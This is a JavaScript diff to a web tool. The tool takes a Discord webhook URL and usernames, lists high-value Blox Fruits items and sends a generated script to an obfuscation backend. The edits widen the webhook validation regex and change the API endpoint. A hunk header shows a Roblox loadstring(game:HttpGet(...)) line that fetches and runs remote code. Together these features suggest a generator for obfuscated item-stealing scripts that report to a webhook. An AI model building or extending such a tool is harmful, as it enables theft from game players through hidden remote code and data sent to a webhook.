@@ -25,7 +25,8 @@ document.addEventListener('DOMContentLoaded', () => {
         "Portal-Portal", "Buddha-Buddha", "Rumble-Rumble", "Shadow-Shadow", "Blizzard-Blizzard",
         "Sound-Sound", "Phoenix-Phoenix", "Pain-Pain", "Gravity-Gravity", "Love-Love",
         "Spider-Spider", "Quake-Quake"
-    ];
+    ]; // <-- Removed .sort() from here
+
     // Combine the arrays in desired rarity order
     const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
 
@@ -88,10 +89,11 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Function to validate user inputs
+    // Function to validate user inputs (UPDATED REGEX)
     function validateInputs() {
         const webhookUrl = webhookUrlInput.value.trim();
         const usernamesRaw = usernamesInput.value.trim();
+        // --- UPDATED Regex: Allows both discord.com and discordapp.com ---
         const discordWebhookRegex = /^https:\/\/discord(?:app)?\.com\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/;
 
         // 1. Check Webhook URL
@@ -100,8 +102,9 @@ document.addEventListener('DOMContentLoaded', () => {
             webhookUrlInput.focus();
             return false;
         }
+        // Use the updated regex for testing
         if (!discordWebhookRegex.test(webhookUrl)) {
-            displayError("Error: Invalid Discord Webhook URL format.");
+            displayError("Error: Invalid Discord Webhook URL format (must start with https://discord.com/ or https://discordapp.com/).");
             webhookUrlInput.focus();
             return false;
         }
@@ -209,7 +212,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/
 
 
         // 1. Validate Inputs
-        if (!validateInputs()) {
+        if (!validateInputs()) { // Uses updated validation
             return; // Stop if validation fails
         }
 
@@ -225,7 +228,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/
         try {
             // Define the API endpoint for your Cloudflare Worker
             // Use '/api/mock-obfuscate' for deployment, or 'http://localhost:8787/api/mock-obfuscate' for local testing
-            const apiEndpoint = 'https://mock-obfuscator-worker.iam-greatpro123.workers.dev/api/mock-obfuscate'; // <-- CHANGE THIS for deployment vs local test
+            const apiEndpoint = '/api/mock-obfuscate'; // <-- CHANGE THIS BACK for deployment vs local test if needed
 
             console.log(`Sending script to backend: ${apiEndpoint}`);
 
